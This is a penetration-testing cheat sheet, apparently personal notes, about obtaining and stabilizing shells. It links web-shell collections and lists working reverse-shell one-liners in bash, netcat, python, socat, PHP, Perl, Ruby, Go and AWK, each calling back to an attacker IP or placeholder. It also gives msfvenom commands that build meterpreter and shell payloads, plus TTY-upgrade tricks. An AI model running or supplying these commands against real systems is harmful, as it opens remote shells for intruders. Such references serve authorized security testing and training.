# Shells 
## Contents
- [Shells](#shells)
  * [Contents](#contents)
  * [Web shells](#web-shells)
  * [Debugging Shells](#debugging-shells)
  * [Reverse shell commands](#reverse-shell-commands)
  * [Msfvenom Payloads](#msfvenom-payloads)
  * [Upgrading to a pseudo terminal / TTY](#upgrading-to-a-pseudo-terminal---tty)

## Web shells 
[phpbash web shell](https://github.com/Arrexel/phpbash)  
[pentest monkey php shell](https://github.com/pentestmonkey/php-reverse-shell)  
[p0wney web shell](https://github.com/flozz/p0wny-shell)  
[white winter wolf web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)  
[collection of PHP webshells](https://github.com/JohnTroony/php-webshells/tree/master/Collection)    

    /usr/share/seclists/Web-Shells

## Debugging Shells   
executing a command and no response - maybe the command is redirecting to stderr not stdout?
2>&1
Check for versions / path variables  
No path variable? Need absolute path 

    /bin/bash -c 'id'   

## Reverse shell commands  
### Bash (requires /dev/tcp support, primarily found in RedHat/Debian distros):  
One bash version (compromised account's shell must be bash; does not work via www-data):  

    bash -i >& /dev/tcp/10.6.85.85/4444 0>&1   
Two bash version (safer, since parent shell can be anything):    

    bash -c 'bash -i >& /dev/tcp/172.17.0.2/1337 0>&1'     
### netcat  
nc w/ -e (traditional):  

    rlwrap nc -e /bin/sh 172.16.5.1 4242   
    
    -e /bin/sh 
    -e /bin/bash
    -e /bin/zsh
    -e /bin/ash
    
nc openbsd (no -e):    

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.85.85 53 >/tmp/f    
    
### other languages  
python: 

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' 
    
python ipv6:

    python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
    
socat                     

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444 
    
PHP            
    
    php -r '$sock=fsockopen("10.6.85.85",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 

Perl 

    perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
Ruby 

    ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    
    
Golang 

    echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

AWK

    awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    
[Tiberius Reverse Shells](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/reverse-shells.rst) 

[Payload All the Things Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 

[Reverse Shell Cheatsheet](https://github.com/d4t4s3c/Reverse-Shell-Cheat-Sheet)  

[Reverse and Bind Shells with Socat](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)

## Msfvenom Payloads 
[Reference](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)    

    msfvenom -l payloads      #list payloads    
    msfvenom -l encoders      #list encoders 
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	
    msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
    msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
    msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
    
## Upgrading to a pseudo terminal / TTY     
[Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)  
[What Happens in a Shell Upgrade?](What Happens In a "Shell Upgrade"?)   

    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash')
    /bin/sh -i  
    script /dev/null -c bash      #create new pty owned by current user, fixed in newer versions of screen        
    
    SHELL=/bin/bash script -q /dev/null        Ctrl-Z        stty raw -echo        fg    reset    xterm
    
    Can you upload a [socat static binary](https://github.com/andrew-d/static-binaries)? 
    
    vi -> :sh or :!UNIX_command
    perl —e 'exec "/bin/sh";' 
    perl: exec "/bin/sh"; 
    ruby: exec "/bin/sh" 
    lua: os.execute('/bin/sh') 
    

